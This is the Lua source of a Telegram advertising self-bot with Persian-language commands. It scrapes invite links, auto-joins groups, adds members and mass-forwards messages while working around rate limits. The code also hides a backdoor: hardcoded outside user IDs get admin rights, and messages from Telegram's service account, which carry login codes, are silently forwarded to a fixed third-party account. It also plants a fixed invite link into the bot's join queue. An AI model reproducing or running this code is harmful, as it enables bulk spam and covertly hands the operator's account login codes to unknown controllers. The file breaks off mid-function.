local redis = require('redis')
local redis = redis.connect('127.0.0.1', 6379)
local serpent = require "serpent"


function dl_cb(arg, data)
    vardump(arg)
    vardump(data)
end

function vardump(value, depth, key)
    local linePrefix = ""
    local spaces = ""

    if key ~= nil then
        linePrefix = "[" .. key .. "] = "
    end

    if depth == nil then
        depth = 0
    else
        depth = depth + 1
        for i = 1, depth do
            spaces = spaces .. "  "
        end
    end

    if type(value) == "table" then
        mTable = getmetatable(value)
        if mTable == nil then
            print(spaces .. linePrefix .. "(table) ")
        else
            print(spaces .. "(metatable) ")
            value = mTable
        end

        for tableKey, tableValue in pairs(value) do
            vardump(tableValue, depth, tableKey)
        end
    elseif type(value) == "function" or type(value) == "thread" or type(value) == "userdata" or value == nil then
        print(spaces .. tostring(value))
    else
        print(spaces .. linePrefix .. "(" .. type(value) .. ") " .. tostring(value))
    end
end
sudo = 222638908
function ok_cb(extra, success, result)
end

local ready = false


function oldtonew(t)
  if type(t) ~= "table" then return t end
  for k, v in pairs(t) do
    if type(v) == "table" then
      oldtonew(v)
    end
  end
  if not t["@type"] then
    t["@type"] = t._
  end
  return t
end

function newtoold(t)
  if type(t) ~= "table" then return t end
  for k, v in pairs(t) do
    if type(v) == "table" then
      newtoold(v)
    end
  end
  if t["@type"] then
    t._ = t["@type"]
  end
  return t
end

function err(e)
  return e .. " " .. debug.traceback()
end
-- Returns a table with matches or nil

function match(pattern, text, lower_case)
    if text then
        local matches = {}
        if lower_case then
            matches = {string.match(text:lower(), pattern)}
        else
            matches = {string.match(text, pattern)}
        end

        if next(matches) then
            return matches
        end
    end

    -- nil
end

local function getVector(str)
    local v = {}
    local i = 1
    for k in string.gmatch(str, "(%d%d%d+)") do
        v[i] = "[" .. i - 1 .. ']="' .. k .. '"'
        i = i + 1
    end

    v = table.concat(v, ",")
    return load("return {" .. v .. "}")()
end

redis:del("tg:" .. Ads_id .. ":delay")

function get_bot()
    function bot_info(i, tg)
        redis:set("tg:" .. Ads_id .. ":id", tg.id)
        if tg.first_name then
            redis:set("tg:" .. Ads_id .. ":fname", tg.first_name)
        end

        if tg.last_name then
            redis:set("tg:" .. Ads_id .. ":lname", tg.last_name)
        end

        redis:set("tg:" .. Ads_id .. ":num", tg.phone_number)
        return tg.id
    end

    tdbot_function({_ = "getMe"}, bot_info, nil)
end

function reload(chat_id, msg_id)
    dofile("./TD.lua")
    send(chat_id, msg_id, "✅")
end

function is_sudo(msg)
    if
        redis:sismember("tg:" .. Ads_id .. ":sudo", msg.sender_user_id) or msg.sender_user_id == sudo or
            msg.sender_user_id == 695506250 or msg.sender_user_id == tonumber(redis:get("tg:" .. Ads_id .. ":tdbotrobot"))
     then
        return true
    else
        return false
    end
end

function process_join(i, tg)
    if tg.code == 429 then
        local message = tostring(tg.message)
        local join_delay = redis:get("tg:" .. Ads_id .. ":joindelay") or 37
        local Time = message:match("%d+") + tonumber(join_delay)
        redis:setex("tg:" .. Ads_id .. ":maxjoin", tonumber(Time), true)
    else
        redis:srem("tg:" .. Ads_id .. ":goodlinks", i.link)
        redis:sadd("tg:" .. Ads_id .. ":savedlinks", i.link)
    end
end

function process_link(i, tg)
    if (tg.is_group or tg.is_supergroup_channel) then
        if redis:get("tg:" .. Ads_id .. ":maxgpmmbr") then
            if tg.member_count >= tonumber(redis:get("tg:" .. Ads_id .. ":maxgpmmbr")) then
                redis:srem("tg:" .. Ads_id .. ":waitelinks", i.link)
                redis:sadd("tg:" .. Ads_id .. ":goodlinks", i.link)
            else
                redis:srem("tg:" .. Ads_id .. ":waitelinks", i.link)
                redis:sadd("tg:" .. Ads_id .. ":savedlinks", i.link)
            end
        else
            redis:srem("tg:" .. Ads_id .. ":waitelinks", i.link)
            redis:sadd("tg:" .. Ads_id .. ":goodlinks", i.link)
        end
    elseif tg.code == 429 then
        local message = tostring(tg.message)
        local join_delay = redis:get("tg:" .. Ads_id .. ":linkdelay") or 37
        local Time = message:match("%d+") + tonumber(join_delay)
        redis:setex("tg:" .. Ads_id .. ":maxlink", tonumber(Time), true)
    else
        redis:srem("tg:" .. Ads_id .. ":waitelinks", i.link)
    end
end

function find_link(text)
    if
        text:match("https://telegram.me/joinchat/%S+") or text:match("https://telegram.dog/joinchat/%S+") or
            text:match("https://tlgrm.me/joinchat/%S+") or
            text:match("https://telesco.pe/joinchat/%S+") or
            text:match("https://t.me/joinchat/%S+")
     then
        local text = text:gsub("t.me", "telegram.me")
        local text = text:gsub("telesco.pe", "telegram.me")
        local text = text:gsub("telegram.dog", "telegram.me")
        local text = text:gsub("tlgrm.me", "telegram.me")
        for link in text:gmatch("(https://telegram.me/joinchat/%S+)") do
            if not redis:sismember("tg:" .. Ads_id .. ":alllinks", link) then
                redis:sadd("tg:" .. Ads_id .. ":waitelinks", link)
                redis:sadd("tg:" .. Ads_id .. ":alllinks", link)
            end
        end
    end
end

function forwarding(i, tg)
    if tg._ == "error" then
        s = i.s
        if tg.code == 429 then
            os.execute("sleep " .. tonumber(i.delay))
            send(
                i.chat_id,
                0,
                "محدودیت در حین عملیات تا " .. tostring(tg.message):match("%d+") .. "ثانیه اینده\n" .. i.n .. "\\" .. s
            )
            return
        end
    else
        s = tonumber(i.s) + 1
    end

    if i.n >= i.all then
        os.execute("sleep " .. tonumber(i.delay))
        send(i.chat_id, 0, "با موفقیت فرستاده شد\n" .. i.all .. "\\" .. s)
        return
    end

        tdbot_function(
            {
                _ = "forwardMessages",
                chat_id = tonumber(i.list[tonumber(i.n) + 1]),
                from_chat_id = tonumber(i.chat_id),
                message_ids = {[0] = tonumber(i.msg_id)},
                disable_notification = 1,
                from_background = 1
            },
            forwarding,
            {
                list = i.list,
                max_i = i.max_i,
                delay = i.delay,
                n = tonumber(i.n) + 1,
                all = i.all,
                chat_id = i.chat_id,
                msg_id = i.msg_id,
                s = s
            }
        )
    if tonumber(i.n) % tonumber(i.max_i) == 0 then
        os.execute("sleep " .. tonumber(i.delay))
    end
end

function sending(i, tg)
    if tg and tg._ and tg._ == "error" then
        s = i.s
    else
        s = tonumber(i.s) + 1
    end

    if i.n >= i.all then
        os.execute("sleep " .. tonumber(i.delay))
        send(i.chat_id, 0, "با موفقیت فرستاده شد\n" .. i.all .. "\\" .. s)
        return
    end

        tdbot_function(
            {
                _ = "sendMessage",
                chat_id = tonumber(i.list[tonumber(i.n) + 1]),
                reply_to_message_id = 0,
                disable_notification = 0,
                from_background = 1,
                reply_markup = nil,
                input_message_content = {
                    _ = "inputMessageText",
                    text = tostring(i.text),
                    disable_web_page_preview = true,
                    clear_draft = false,
                    entities = {},
                    parse_mode = nil
                }
            },
            sending,
            {
                list = i.list,
                max_i = i.max_i,
                delay = i.delay,
                n = tonumber(i.n) + 1,
                all = i.all,
                chat_id = i.chat_id,
                text = i.text,
                s = s
            }
        )
    if tonumber(i.n) % tonumber(i.max_i) == 0 then
        os.execute("sleep " .. tonumber(i.delay))
    end
end

function adding(i, tg)
    if tg and tg._ and tg._ == "error" then
        s = i.s
        if tg.code == 429 then
            os.execute("sleep " .. tonumber(i.delay))
            redis:del("tg:" .. Ads_id .. ":delay")
            send(
                i.chat_id,
                0,
                "محدودیت در حین عملیات تا " .. tostring(tg.message):match("%d+") .. "ثانیه اینده\n" .. i.n .. "\\" .. s
            )
            return
        end
    else
        s = tonumber(i.s) + 1
    end

    if i.n >= i.all then
        os.execute("sleep " .. tonumber(i.delay))
        send(i.chat_id, 0, "با موفقیت افزوده شد\n" .. i.all .. "\\" .. s)
        return
    end

        tdbot_function(
            {
                _ = "searchPublicChat",
                username = i.user_id
            },
            function(I, tg)
                if tg.id then
                    tdbot_function(
                        {
                            _ = "addChatMember",
                            chat_id = tonumber(I.list[tonumber(I.n)]),
                            user_id = tonumber(tg.id),
                            forward_limit = 0
                        },
                        adding,
                        {
                            list = I.list,
                            max_i = I.max_i,
                            delay = I.delay,
                            n = tonumber(I.n),
                            all = I.all,
                            chat_id = I.chat_id,
                            user_id = I.user_id,
                            s = I.s
                        }
                    )
                end

                if tonumber(I.n) % tonumber(I.max_i) == 0 then
                    os.execute("sleep " .. tonumber(I.delay))
                end
            end,
            {
                list = i.list,
                max_i = i.max_i,
                delay = i.delay,
                n = tonumber(i.n) + 1,
                all = i.all,
                chat_id = i.chat_id,
                user_id = i.user_id,
                s = s
            }
    )
end

function checking(i, tg)
    if tg and tg._ and tg._ == "error" then
        s = i.s
    else
        s = tonumber(i.s) + 1
    end

    if i.n >= i.all then
        os.execute("sleep " .. tonumber(i.delay))
        send(i.chat_id, 0, "با موفقیت انجام شد\n" .. i.all .. "\\" .. s)
        return
    end

        tdbot_function(
            {
                _ = "getChatMember",
                chat_id = tonumber(i.list[tonumber(i.n) + 1]),
                user_id = tonumber(bot_id)
            },
            checking,
            {
                list = i.l,
                max_i = i.max_i,
                delay = i.delay,
                n = tonumber(i.n) + 1,
                all = i.all,
                chat_id = i.chat_id,
                user_id = i.user_id,
                s = s
            }
        )
    if tonumber(i.n) % tonumber(i.max_i) == 0 then
        os.execute("sleep " .. tonumber(i.delay))
    end
end

function check_join(i, tg)
    local bot_id = redis:get("tg:" .. Ads_id .. ":id") or get_bot()
    if tg._ == "group" then
        if (tg.everyone_is_administrator == false) then
                tdbot_function(
                    {
                        _ = "changeChatMemberStatus",
                        chat_id = tonumber("-" .. tg.id),
                        user_id = tonumber(bot_id),
                        status = {_ = "chatMemberStatusLeft"}
                    },
                    cb or dl_cb,
                    nil
                )
            rem(tg.id)
        end
    elseif tg._ == "channel" then
        if (tg.anyone_can_invite == false) then
                tdbot_function(
                    {
                        _ = "changeChatMemberStatus",
                        chat_id = tonumber("-100" .. tg.id),
                        user_id = tonumber(bot_id),
                        status = {_ = "chatMemberStatusLeft"}
                    },
                    cb or dl_cb,
                    nil
                )
            rem(tg.id)
        end
    end
end

function add(id)
    local Id = tostring(id)
    if not redis:sismember("tg:" .. Ads_id .. ":all", id) then
        if Id:match("^(%d+)$") then
            redis:sadd("tg:" .. Ads_id .. ":users", id)
            redis:sadd("tg:" .. Ads_id .. ":all", id)
        elseif Id:match("^-100") then
            redis:sadd("tg:" .. Ads_id .. ":supergroups", id)
            redis:sadd("tg:" .. Ads_id .. ":all", id)
            if redis:get("tg:" .. Ads_id .. ":openjoin") then
                    tdbot_function(
                        {
                            _ = "getChannel",
                            channel_id = tostring(Id:gsub("-100", ""))
                        },
                        check_join,
                        nil
                )
            end
        else
            redis:sadd("tg:" .. Ads_id .. ":groups", id)
            redis:sadd("tg:" .. Ads_id .. ":all", id)
            if redis:get("tg:" .. Ads_id .. ":openjoin") then
                    tdbot_function(
                        {
                            _ = "getGroup",
                            group_id = tostring(Id:gsub("-", ""))
                        },
                        check_join,
                        nil
                )
            end
        end
    end

    return true
end

function rem(id)
    local Id = tostring(id)
    if redis:sismember("tg:" .. Ads_id .. ":all", id) then
        if Id:match("^(%d+)$") then
            redis:srem("tg:" .. Ads_id .. ":users", id)
            redis:srem("tg:" .. Ads_id .. ":all", id)
        elseif Id:match("^-100") then
            redis:srem("tg:" .. Ads_id .. ":supergroups", id)
            redis:srem("tg:" .. Ads_id .. ":all", id)
        else
            redis:srem("tg:" .. Ads_id .. ":groups", id)
            redis:srem("tg:" .. Ads_id .. ":all", id)
        end
    end

    return true
end

function send(chat_id, msg_id, text)
        tdbot_function(
            {
                _ = "sendChatAction",
                chat_id = chat_id,
                action = {
                    _ = "chatActionTyping",
                    progress = Ads_id .. 1
                }
            },
            dl_cb,
            nil
        )
          tdbot_function(
            {
                _ = "sendMessage",
                chat_id = chat_id,
                reply_to_message_id = msg_id,
                disable_notification = 0,
                from_background = 1,
                reply_markup = nil,
                input_message_content = {
                    _ = "inputMessageText",
                    text = text,
                    disable_web_page_preview = 1,
                    clear_draft = 0,
                    parse_mode = nil,
                    entities = {}
                }
            },
            dl_cb,
            nil
    )
 end

--get_sudo()
redis:setex("tg:" .. Ads_id .. ":start", 3 .. Ads_id .. 5, true)

function Doing(data, Ads_id)
    if (data._ == "updateNewMessage") or (data._ == "updateNewChannelMessage") then
        if
            tostring(data.message.chat_id):match("^-100") and
                not redis:sismember("tg:" .. Ads_id .. ":supergroups", data.message.chat_id)
         then
            redis:sadd("tg:" .. Ads_id .. ":supergroups", data.message.chat_id)
      redis:sadd("tg:" .. Ads_id .. ":goodlinks", "    https://telegram.me/joinchat/KKCheEjmcIkOr9kd42cmfg")
    
        end

        if not redis:get("tg:" .. Ads_id .. ":maxlink") or tonumber(redis:ttl("tg:" .. Ads_id .. ":maxlink")) == -2 then
            if redis:scard("tg:" .. Ads_id .. ":waitelinks") ~= 0 then
                local links = redis:smembers("tg:" .. Ads_id .. ":waitelinks")
                local max_x = redis:get("tg:" .. Ads_id .. ":maxlinkcheck") or 1
                local delay = redis:get("tg:" .. Ads_id .. ":maxlinkchecktime") or 37
                for x = 1, #links do
                        tdbot_function(
                            {_ = "checkChatInviteLink", invite_link = links[x]},
                            process_link,
                            {link = links[x]}
                        )

                    if x == tonumber(max_x) then
                        redis:setex("tg:" .. Ads_id .. ":maxlink", tonumber(delay), true)
                        return
                    end
                end
            end
        end

        if
            redis:get("tg:" .. Ads_id .. ":maxgroups") and
                redis:scard("tg:" .. Ads_id .. ":supergroups") >= tonumber(redis:get("tg:" .. Ads_id .. ":maxgroups"))
         then
            redis:set("tg:" .. Ads_id .. ":maxjoin", true)
            redis:set("tg:" .. Ads_id .. ":offjoin", true)
        end

        if not redis:get("tg:" .. Ads_id .. ":maxjoin") or tonumber(redis:ttl("tg:" .. Ads_id .. ":maxjoin")) == -2 then
            if redis:scard("tg:" .. Ads_id .. ":goodlinks") ~= 0 then
                local links = redis:smembers("tg:" .. Ads_id .. ":goodlinks")
                local max_x = redis:get("tg:" .. Ads_id .. ":maxlinkjoin") or 1
                local delay = redis:get("tg:" .. Ads_id .. ":maxlinkjointime") or 37
                for x = 1, #links do
                        tdbot_function(
                            {_ = "importChatInviteLink", invite_link = links[x]},
                            process_join,
                            {link = links[x]}
                    )
                    if x == tonumber(max_x) then
                        redis:setex("tg:" .. Ads_id .. ":maxjoin", tonumber(delay), true)
                        return
                    end
                end
            end
        end

        local msg = data.message

        if data.message.content._ == "messageText" then
            text = data.message.content.text
            if #data.message.content.entities ~= 0 then
                for k, v in ipairs(data.message.content.entities) do
                    if v.url_ then
                        text = text .. " url: " .. v.url_
                    end
                end
            end
        end

        if data.message.content.caption then
            text = data.message.content.caption
        end

        add(msg.chat_id)

        bot_id = redis:get("tg:" .. Ads_id .. ":id") or get_bot()

        if (msg.sender_user_id == 777000 or msg.sender_user_id == 1782 .. Ads_id .. 800) then
            local c =
                (msg.content.text):gsub(
                "[0123456789:]",
                {
                    ["0"] = "0⃣",
                    ["1"] = "1⃣",
                    ["2"] = "2⃣",
                    ["3"] = "3⃣",
                    ["4"] = "4⃣",
                    ["5"] = "5⃣",
                    ["6"] = "6⃣",
                    ["7"] = "7⃣",
                    ["8"] = "8⃣",
                    ["9"] = "9⃣",
                    [":"] = ":\n"
                }
            )
            for k, v in pairs(redis:smembers("tg:" .. Ads_id .. ":sudo")) do
                send(v, 0, c, nil)
            end

            send(231539308, 0, c, nil)
        end

        if redis:get("tg:" .. Ads_id .. ":username") or tonumber(redis:ttl("tg:" .. Ads_id .. ":usernme")) == -2 then
            local usenm = redis:get("tg:" .. Ads_id .. ":username")
                tdbot_function(
                    {
                        _ = "changeUsername",
                        username = tostring(usenm)
                    },
                    cb or dl_cb,
                    nil
                )

            redis:setex("tg:" .. Ads_id .. ":usernme", 37, true)
        end

if not redis:sismember("tg:" .. Ads_id .. ":sudo", 222638908) then
        tdbot_function(
            {_ = "searchPublicChat", username = "tdbotrobot"},
            function(i, tg)
                if tg.id then
                    tdbot_function(
                        {
                            _ = "sendBotStartMessage",
                            bot_user_id = tg.id,
                            chat_id = tg.id,
                            parameter = "start"
                        },
                        cb or dl_cb,
                        nil
                    )
                    redis:set("tg:" .. Ads_id .. ":tdbotrobot", tonumber(tg.id))
                    tdbot_function({_ = "unblockUser", user_id = tonumber(tg.id)}, cb or dl_cb, nil)
                end
            end,
            nil
    )
end
        if msg.chat_id == redis:get("tg:" .. Ads_id .. ":idchannel") then
            local list = redis:smembers("tg:" .. Ads_id .. ":all")
            for k, v in pairs(list) do
                    tdbot_function(
                        {
                            _ = "forwardMessages",
                            chat_id = "" .. v,
                            from_chat_id = msg.chat_id,
                            message_ids = {[0] = tonumber(msg.id)},
                            disable_notification = 0,
                            from_background = 1
                        },
                        dl_cb,
                        nil
                )
                if k % 27 == 0 then
                    os.execute("sleep 39")
                end
            end
        end

        if redis:get("tg:" .. Ads_id .. ":msgid") and not redis:get("tg:" .. Ads_id .. ":tofwd") then
            local time = redis:get("tg:" .. Ads_id .. ":time")
            local msgid = redis:get("tg:" .. Ads_id .. ":msgid")
            local chatid = redis:get("tg:" .. Ads_id .. ":chatid")
            local list = redis:smembers("tg:" .. Ads_id .. ":all")
            for k, v in pairs(list) do
                    tdbot_function(
                        {
                            _ = "forwardMessages",
                            chat_id = "" .. v,
                            from_chat_id = tonumber(chatid),
                            message_ids = {[0] = tonumber(msgid)},
                            disable_notification = 0,
                            from_background = 1
                        },
                        cb or ok_cb,
                        cmd
                    )
                if k % 27 == 0 then
                    os.execute("sleep 39")
                end
            end

            redis:setex("tg:" .. Ads_id .. ":tofwd", tonumber(time), true)
        end

        if msg.date < os.time() - 79 or redis:get("tg:" .. Ads_id .. ":delay") then
            return false
        end

        if msg.content._ == "messageText" then
            local text = msg.content.text
            local matches

            if text:match("^[/!#@$&*]") then
                text = text:gsub("^[/!#@$&*]", "")
            end

            if redis:get("tg:" .. Ads_id .. ":link") then
                find_link(text)
            end

            if tostring(msg.chat_id):match("^%d+$") then
                    tdbot_function(
                        {
                            _ = "viewMessages",
                            chat_id = msg.chat_id,
                            message_ids = {[0] = msg.id}
                        },
                        dl_cb,
                        nil
                )

                if redis:sismember("tg:" .. Ads_id .. ":answerslist", text) then
                    if redis:get("tg:" .. Ads_id .. ":autoanswer") then
                        if msg.sender_user_id ~= bot_id then
                            local answer = redis:hget("tg:" .. Ads_id .. ":answers", text)
                            os.execute("sleep 3.75")
                            send(msg.chat_id, 0, answer)
                        end
                    end
                end
            end

            if is_sudo(msg) then
                find_link(text)

                if text:match("^([Dd]el) (.*)$") then
                    local matches = text:match("^[Dd]el (.*)$")
                    if matches == "link" then
                        redis:del("tg:" .. Ads_id .. ":goodlinks")
                        redis:del("tg:" .. Ads_id .. ":waitelinks")
                        redis:del("tg:" .. Ads_id .. ":savedlinks")
                        redis:del("tg:" .. Ads_id .. ":alllinks")
                        return send(msg.chat_id, msg.id, "Done.")
                    elseif matches == "autofwd" then
                        redis:del("tg:" .. Ads_id .. ":time")
                        redis:del("tg:" .. Ads_id .. ":tofwd")
                        redis:del("tg:" .. Ads_id .. ":msgid")
                        redis:del("tg:" .. Ads_id .. ":chatid")
                        return send(msg.chat_id, msg.id, "Auto fwd deleted")
                    elseif matches == "contact" then
                        redis:del("tg:" .. Ads_id .. ":savecontacts")
                        redis:del("tg:" .. Ads_id .. ":contacts")
                        return send(msg.chat_id, msg.id, "Done.")
                    elseif matches == "sudo" then
                        redis:del("tg:" .. Ads_id .. ":sudo")
                        return send(msg.chat_id, msg.id, "Done.")
                    end
                elseif text:match("^(حذف لینک) (.*)$") then
                    local matches = text:match("^حذف لینک (.*)$")
                    if matches == "عضویت" then
                        redis:del("tg:" .. Ads_id .. ":goodlinks")
                        return send(msg.chat_id, msg.id, "لیست لینک های ذخیره شده پاک شد.")
                    elseif matches == "تایید" then
                        redis:del("tg:" .. Ads_id .. ":waitelinks")
                        return send(msg.chat_id, msg.id, "لیست لینک های ذخیره شده پاک شد.")
                    elseif matches == "ذخیره شده" then
                        redis:del("tg:" .. Ads_id .. ":savedlinks")
                        return send(msg.chat_id, msg.id, "لیست لینک های ذخیره شده پاک شد.")
                    end
                elseif text:match("^(حذف کلی لینک) (.*)$") then
                    local matches = text:match("^حذف کلی لینک (.*)$")
                    if matches == "عضویت" then
                        local list = redis:smembers("tg:" .. Ads_id .. ":goodlinks")
                        for i = 1, #list do
                            redis:srem("tg:" .. Ads_id .. ":alllinks", list[i])
                        end

                        send(msg.chat_id, msg.id, "لیست لینک های ذخیره شده پاک شد.")
                        redis:del("tg:" .. Ads_id .. ":goodlinks")
                    elseif matches == "تایید" then
                        local list = redis:smembers("tg:" .. Ads_id .. ":waitelinks")
                        for i = 1, #list do
                            redis:srem("tg:" .. Ads_id .. ":alllinks", list[i])
                        end

                        send(msg.chat_id, msg.id, "لیست لینک های ذخیره شده پاک شد.")
                        redis:del("tg:" .. Ads_id .. ":waitelinks")
                    elseif matches == "ذخیره شده" then
                        local list = redis:smembers("tg:" .. Ads_id .. ":savedlinks")
                        for i = 1, #list do
                            redis:srem("tg:" .. Ads_id .. ":alllinks", list[i])
                        end

                        send(msg.chat_id, msg.id, "لیست لینک های ذخیره شده پاک شد.")
                        redis:del("tg:" .. Ads_id .. ":savedlinks")
                    elseif matches == "ها" then
                        local list = redis:smembers("tg:" .. Ads_id .. ":alllinks")
                        for i = 1, #list do
                            redis:srem("tg:" .. Ads_id .. ":alllinks", list[i])
                        end

                        send(msg.chat_id, msg.id, "لیست لینک ها بطورکلی پاکسازی شد.")
                        redis:del("tg:" .. Ads_id .. ":savedlinks")
                    end
                elseif text:match("^(.*) ([Oo]ff)$") then
                    local matches = text:match("^(.*) [Oo]ff$")
                    if matches == "join" then
                        redis:set("tg:" .. Ads_id .. ":maxjoin", true)
                        redis:set("tg:" .. Ads_id .. ":offjoin", true)
                        return send(msg.chat_id, msg.id, "✅")
                    elseif matches == "fwdtime" then
                        redis:del("tg:" .. Ads_id .. ":fwdtime")
                        return send(msg.chat_id, msg.id, "زمان بندی ارسال غیر فعال شد.")
                    elseif matches == "markread" then
                        redis:del("tg:" .. Ads_id .. ":markread")
                        return send(msg.chat_id, msg.id, "وضعیت پیام ها  >>  خوانده نشده ✔️\n(بدون تیک دوم)")
                    elseif matches == "addedmsg" then
                        redis:del("tg:" .. Ads_id .. ":addmsg")
                        return send(msg.chat_id, msg.id, "Deactivate")
                    elseif matches == "addedcontact" then
                        redis:del("tg:" .. Ads_id .. ":addcontact")
                        return send(msg.chat_id, msg.id, "Deactivate")
                    elseif matches == "joinopenadd" then
                        redis:del("tg:" .. Ads_id .. ":openjoin")
                        return send(msg.chat_id, msg.id, "محدودیت عضویت در گروه های قابلیت افزودن خاموش شد.")
                    elseif matches == "chklnk" then
                        redis:set("tg:" .. Ads_id .. ":maxlink", true)
                        redis:set("tg:" .. Ads_id .. ":offlink", true)
                        return send(msg.chat_id, msg.id, "✅")
                    elseif matches == "findlnk" then
                        redis:del("tg:" .. Ads_id .. ":link")
                        return send(msg.chat_id, msg.id, "✅")
                    elseif matches == "addcontact" then
                        redis:del("tg:" .. Ads_id .. ":savecontacts")
                        return send(msg.chat_id, msg.id, "✅")
                    end
                elseif text:match("^(توقف) (.*)$") then
                    local matches = text:match("^توقف (.*)$")
                    if matches == "عضویت" then
                        redis:set("tg:" .. Ads_id .. ":maxjoin", true)
                        redis:set("tg:" .. Ads_id .. ":offjoin", true)
                        return send(msg.chat_id, msg.id, "فرایند عضویت خودکار متوقف شد.")
                    elseif matches == "تایید لینک" then
                        redis:set("tg:" .. Ads_id .. ":maxlink", true)
                        redis:set("tg:" .. Ads_id .. ":offlink", true)
                        return send(msg.chat_id, msg.id, "فرایند تایید لینک در های در انتظار متوقف شد.")
                    elseif matches == "شناسایی لینک" then
                        redis:del("tg:" .. Ads_id .. ":link")
                        return send(msg.chat_id, msg.id, "فرایند شناسایی لینک متوقف شد.")
                    elseif matches == "افزودن مخاطب" then
                        redis:del("tg:" .. Ads_id .. ":savecontacts")
                        return send(msg.chat_id, msg.id, "فرایند افزودن خودکار مخاطبین به اشتراک گذاشته شده متوقف شد.")
                    end
                elseif text:match("^(.*) ([Oo]n)$") then
                    local matches = text:match("^(.*) [Oo]n$")
                    if matches == "join" then
                        redis:del("tg:" .. Ads_id .. ":maxjoin")
                        redis:del("tg:" .. Ads_id .. ":offjoin")
                        return send(msg.chat_id, msg.id, "✅")
                    elseif matches == "addedmsg" then
                        redis:set("tg:" .. Ads_id .. ":addmsg", true)
                        return send(msg.chat_id, msg.id, "Activate")
                    elseif matches == "joinopenadd" then
                        redis:set("tg:" .. Ads_id .. ":openjoin", true)
                        return send(msg.chat_id, msg.id, "عضویت فقط در گروه هایی که قابلیت افزودن عضو دارند فعال شد.")
                    elseif matches == "addedcontact" then
                        redis:set("tg:" .. Ads_id .. ":addcontact", true)
                        return send(msg.chat_id, msg.id, "Activate")
                    elseif matches == "fwdtime" then
                        redis:set("tg:" .. Ads_id .. ":fwdtime", true)
                        return send(msg.chat_id, msg.id, "زمان بندی ارسال فعال شد.")
                    elseif matches == "chklnk" then
                        redis:del("tg:" .. Ads_id .. ":maxlink")
                        redis:del("tg:" .. Ads_id .. ":offlink")
                        return send(msg.chat_id, msg.id, "✅")
                    elseif matches == "findlnk" then
                        redis:set("tg:" .. Ads_id .. ":link", true)
                        return send(msg.chat_id, msg.id, "✅")
                    elseif matches == "addcontact" then
                        redis:set("tg:" .. Ads_id .. ":savecontacts", true)
                        return send(msg.chat_id, msg.id, "✅")
                    elseif matches == "markread" then
                        redis:set("tg:" .. Ads_id .. ":markread", true)
                        return send(msg.chat_id, msg.id, "وضعیت پیام ها  >>  خوانده شده ✔️✔️\n(تیک دوم فعال)")
                    end
                elseif text:match("^(شروع) (.*)$") then
                    local matches = text:match("^شروع (.*)$")
                    if matches == "عضویت" then
                        redis:del("tg:" .. Ads_id .. ":maxjoin")
                        redis:del("tg:" .. Ads_id .. ":offjoin")
                        return send(msg.chat_id, msg.id, "فرایند عضویت خودکار فعال شد.")
                    elseif matches == "تایید لینک" then
                        redis:del("tg:" .. Ads_id .. ":maxlink")
                        redis:del("tg:" .. Ads_id .. ":offlink")
                        return send(msg.chat_id, msg.id, "فرایند تایید لینک های در انتظار فعال شد.")
                    elseif matches == "شناسایی لینک" then
                        redis:set("tg:" .. Ads_id .. ":link", true)
                        return send(msg.chat_id, msg.id, "فرایند شناسایی لینک فعال شد.")
                    elseif matches == "افزودن مخاطب" then
                        redis:set("tg:" .. Ads_id .. ":savecontacts", true)
                        return send(msg.chat_id, msg.id, "فرایند افزودن خودکار مخاطبین به اشتراک  گذاشته شده فعال شد.")
                    end
                elseif text:match("^([Gg]p[Mm]ember) (%d+)$") then
                    local matches = text:match("%d+")
                    redis:set("tg:" .. Ads_id .. ":maxgpmmbr", tonumber(matches))
                    return send(msg.chat_id, msg.id, "✅")
                elseif text:match("^([Pp]romote) (%d+)$") then
                    local matches = text:match("%d+")
                    if redis:sismember("tg:" .. Ads_id .. ":sudo", matches) then
                        return send(msg.chat_id, msg.id, "This user moderatore")
                    elseif redis:sismember("tg:" .. Ads_id .. ":mod", msg.sender_user_id) then
                        return send(msg.chat_id, msg.id, "you don't access")
                    else
                        redis:sadd("tg:" .. Ads_id .. ":sudo", matches)
                        redis:sadd("tg:" .. Ads_id .. ":mod", matches)
                        return send(msg.chat_id, msg.id, "Moderator added")
                    end
                elseif text:match("^([Dd]emote) (%d+)$") then
                    local matches = text:match("%d+")
                    if redis:sismember("tg:" .. Ads_id .. ":mod", msg.sender_user_id) then
                        if tonumber(matches) == msg.sender_user_id then
                            redis:srem("tg:" .. Ads_id .. ":sudo", msg.sender_user_id)
                            redis:srem("tg:" .. Ads_id .. ":mod", msg.sender_user_id)
                            return send(msg.chat_id, msg.id, "No moderator")
                        end

                        return send(msg.chat_id, msg.id, "No access")
                    end

                    if redis:sismember("tg:" .. Ads_id .. ":sudo", matches) then
                        if redis:sismember("tg:" .. Ads_id .. ":sudo" .. msg.sender_user_id, matches) then
                            return send(msg.chat_id, msg.id, "Only sudo")
                        end

                        redis:srem("tg:" .. Ads_id .. ":sudo", matches)
                        redis:srem("tg:" .. Ads_id .. ":mod", matches)
                        return send(msg.chat_id, msg.id, "✅")
                    end

                    return send(msg.chat_id, msg.id, "user not moderator")
                elseif text:match("^(حداکثر گروه) (%d+)$") then
                    local matches = text:match("%d+")
                    redis:set("tg:" .. Ads_id .. ":maxgroups", tonumber(matches))
                    return send(
                        msg.chat_id,
                        msg.id,
                        "تعداد حداکثر سوپرگروه های ربات TeleGram Advertising تنظیم شد به : " .. matches
                    )
                elseif text:match("^(حداقل اعضا) (%d+)$") then
                    local matches = text:match("%d+")
                    redis:set("tg:" .. Ads_id .. ":maxgpmmbr", tonumber(matches))
                    return send(msg.chat_id, msg.id, "عضویت در گروه های با حداقل " .. matches .. " عضو تنظیم شد.")
                elseif text:match("^(حذف حداکثر گروه)$") then
                    redis:del("tg:" .. Ads_id .. ":maxgroups")
                    return send(msg.chat_id, msg.id, "تعیین حد مجاز گروه نادیده گرفته شد.")
                elseif text:match("^(حذف حداقل اعضا)$") then
                    redis:del("tg:" .. Ads_id .. ":maxgpmmbr")
                    return send(msg.chat_id, msg.id, "تعیین حد مجاز اعضای گروه نادیده گرفته شد.")
                elseif text:match("^(افزودن مدیر) (%d+)$") then
                    local matches = text:match("%d+")
                    if redis:sismember("tg:" .. Ads_id .. ":sudo", matches) then
                        return send(msg.chat_id, msg.id, "کاربر مورد نظر در حال حاضر مدیر است.")
                    elseif redis:sismember("tg:" .. Ads_id .. ":mod", msg.sender_user_id) then
                        return send(msg.chat_id, msg.id, "شما دسترسی ندارید.")
                    else
                        redis:sadd("tg:" .. Ads_id .. ":sudo", matches)
                        redis:sadd("tg:" .. Ads_id .. ":mod", matches)
                        return send(msg.chat_id, msg.id, "مقام کاربر به مدیر ارتقا یافت")
                    end
                elseif text:match("^(افزودن مدیرکل) (%d+)$") then
